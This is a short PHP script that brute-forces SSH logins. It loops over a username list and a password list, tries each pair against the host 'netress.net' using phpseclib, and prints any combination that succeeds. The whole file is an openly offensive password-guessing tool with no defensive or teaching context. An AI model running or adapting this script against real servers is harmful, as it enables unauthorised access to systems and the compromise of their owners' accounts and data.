<?php
//include('libs/phpseclib/Net/SSH2.php');
$userList = file_get_contents("list/userList");
$users = explode("\n", $userList);
foreach($users as $user) {
	$passList = file_get_contents("list/passList");
	$passes = explode("\n", $passList);
	foreach($passes as $pass) {
		echo "Attempting username '".$user."' and password '".$pass."'\n";
		$ssh = new Net_SSH2('netress.net');
		if(!$ssh->login($user, $pass)) {
			echo "Login Failed, trying next...\n";
		} else {
			echo "Login Succeeded\n";
			echo "Username: " . $user . " and Password: " . $pass."\n";
		}
	}
}
?>